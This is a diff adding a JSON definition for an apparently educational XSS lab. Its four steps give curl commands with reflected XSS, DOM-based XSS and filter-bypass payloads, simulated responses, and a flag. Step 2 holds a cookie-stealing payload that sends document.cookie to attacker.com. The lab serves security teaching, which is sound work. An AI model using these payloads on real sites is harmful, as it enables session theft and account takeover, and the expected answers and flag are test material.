@@ -1,0 +1,50 @@
+{
+  "id": "lab_xss_basics",
+  "title": "Cross-Site Scripting (XSS) Basics",
+  "description": "Learn to identify and exploit XSS vulnerabilities in web applications.",
+  "difficulty": "Intermediate",
+  "duration": "30 min",
+  "category": "Web Security",
+  "semester_level": 2,
+  "scenario": "A web application has a search feature that may be vulnerable to XSS. Your task is to identify and exploit this vulnerability.",
+  "environment": "terminal",
+  "tasks": [
+    {
+      "step": 1,
+      "title": "Test for Reflected XSS",
+      "instruction": "Test the search parameter for reflected XSS by injecting a simple script tag.",
+      "hint": "Use curl with a script payload in the search parameter",
+      "expected_command": "curl 'http://target.com/search?q=<script>alert(1)</script>'",
+      "output": "<html>\n<body>\n<h2>Search Results for: <script>alert(1)</script></h2>\n<p>No results found</p>\n</body>\n</html>",
+      "explanation": "The input is reflected without sanitization - this confirms a reflected XSS vulnerability!"
+    },
+    {
+      "step": 2,
+      "title": "Cookie Stealing Payload",
+      "instruction": "Craft a payload that would steal cookies and send them to an attacker server.",
+      "hint": "Create a script that accesses document.cookie",
+      "expected_command": "curl 'http://target.com/search?q=<script>document.location=\"http://attacker.com/?c=\"+document.cookie</script>'",
+      "output": "<html>\n<body>\n<h2>Search Results for: <script>document.location=\"http://attacker.com/?c=\"+document.cookie</script></h2>\n<p>No results found</p>\n</body>\n</html>",
+      "explanation": "This payload would redirect the victim to the attacker's server with their cookies in the URL."
+    },
+    {
+      "step": 3,
+      "title": "DOM-based XSS Test",
+      "instruction": "Test for DOM-based XSS using the hash fragment.",
+      "hint": "Use a payload in the URL fragment",
+      "expected_command": "curl 'http://target.com/page#<img src=x onerror=alert(1)>'",
+      "output": "HTTP/1.1 200 OK\nContent-Type: text/html\n\n<html>\n<body>\n<div id=\"content\"></div>\n<script>document.getElementById('content').innerHTML = location.hash.slice(1);</script>\n</body>\n</html>",
+      "explanation": "The page uses location.hash unsafely - DOM-based XSS confirmed!"
+    },
+    {
+      "step": 4,
+      "title": "Bypass Basic Filter",
+      "instruction": "The application now filters 'script' - bypass it using event handlers.",
+      "hint": "Use img tag with onerror event",
+      "expected_command": "curl 'http://target.com/search?q=<img src=x onerror=alert(document.domain)>'",
+      "output": "<html>\n<body>\n<h2>Search Results for: <img src=x onerror=alert(document.domain)></h2>\n<p>No results found</p>\n\nFLAG{ISC_XSS_HUNTER_2024}\n</body>\n</html>",
+      "explanation": "Successfully bypassed the filter using an img tag with onerror event handler.",
+      "flag": "FLAG{ISC_XSS_HUNTER_2024}"
+    }
+  ]
+}
